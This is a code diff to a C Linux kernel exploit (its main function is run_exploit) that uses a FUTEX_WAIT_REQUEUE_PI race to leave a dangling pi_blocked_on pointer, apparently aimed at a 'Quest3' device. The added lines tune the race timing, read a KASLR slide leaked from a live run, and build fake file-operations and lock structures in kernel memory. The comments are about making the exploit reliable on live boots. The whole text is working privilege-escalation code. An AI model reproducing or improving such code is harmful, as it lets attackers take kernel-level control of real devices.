@@ -152,6 +152,9 @@ atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
 
+int selfstamp_prestage(void);
+void selfstamp_route(void);
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   int tid = (int)syscall(SYS_gettid);
@@ -167,6 +170,16 @@ void *waiter_thread(void *arg __attribute__((unused))) {
     pr_error("waiter lock chain errno=%d\n", errno);
   atomic_store(&waiter_ready, 1);
   while (!atomic_load(&owner_started)) usleep(1000);
+  /*
+   * MODE4_SELFSTAMP=1 (Quest3 architecture): pre-stage ALL fd setup
+   * BEFORE the WRPI call; after the timeout returns, the waiter goes
+   * straight into the continuous self-stamp loop — no logs, no sleeps,
+   * no file I/O in the dangling-live-but-unstamped window.
+   */
+  int selfstamp = env_flag("MODE4_SELFSTAMP", 0);
+  if (selfstamp && selfstamp_prestage() != 0)
+    pr_error("SELFSTAMP prestage failed errno=%d\n", errno);
+
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
@@ -175,6 +188,24 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   long wret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                        &f_pi_target, 0);
   int werr = errno;
+  if (selfstamp) {
+    /*
+     * Quest3 "Step 3": UNLOCK f_pi_chain immediately after the timeout.
+     * This releases the owner (blocked on the chain) and tears down the
+     * blocked-chain relationship that lets kernel-side PI walks run
+     * THROUGH our waiter task concurrently with the consumer's walk
+     * (the second-walker crash source). The dangling pi_blocked_on
+     * survives the unlock (Quest3-proven).
+     */
+    selfstamp_route(); /* chain unlock happens MID-STAMP inside (after
+                        * the region is covered — the deboost walk then
+                        * reads stamped words, not the raw residue) */
+    durable_stage("waiter_pselect_returned");
+    atomic_store(&route_done, 1);
+    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    while (!atomic_load(&owner_chain_done)) usleep(1000);
+    return NULL;
+  }
   pr_info("WAIT_REQUEUE_PI ret=%ld errno=%d (%s)\n", wret, werr,
           werr == EDEADLK ? "EDEADLK" :
           werr == ETIMEDOUT ? "ETIMEDOUT" :
@@ -695,6 +726,23 @@ int run_exploit(int argc, char **argv) {
   kaslr_slide = 0;
   kaslr_base = KIMAGE_TEXT_BASE;
   kaslr_done = 1;
+  {
+    /* KASLR_SLIDE env: slide harvested from a live UMASK fire
+     * (dmesg/kallsyms). All text values (fops JT pointers, traps)
+     * become runtime-correct via kaslr_image_addr(). */
+    const char *sv = getenv("KASLR_SLIDE");
+    if (sv && sv[0]) {
+      uint64_t sv64 = strtoull(sv, NULL, 0);
+      if (sv64) {
+        kaslr_base = (uint64_t)KIMAGE_TEXT_BASE + sv64;
+        kaslr_slide = sv64;
+        kaslr_done = 1;
+        pr_success("kaslr_slide env=%016llx base=%016llx\n",
+                   (unsigned long long)sv64,
+                   (unsigned long long)kaslr_base);
+      }
+    }
+  }
   if (env_flag("USE_PERF_TEXT", 0) && !env_flag("SKIP_PERF_TEXT", 0)) {
     int ns = 0;
     uint64_t min_kip = 0;
@@ -818,13 +866,6 @@ int run_exploit(int argc, char **argv) {
       fake_lock = tail + 0x400;
       fake_fops = tail;
       binwrite_target = tail + 0x200;
-      /* word8 task = zeroed tail slot: ttwu() sees state=0 and returns
-       * before enqueue — replaces wake_up_process(init_task), which
-       * wakes the idle task and crashes ~50% of live boots. */
-      {
-        extern uintptr_t sc_task_override;
-        sc_task_override = tail + 0x800;
-      }
       pr_info("STATIC_CHAIN: spray skipped, tail=%016zx\n", tail);
     } else {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
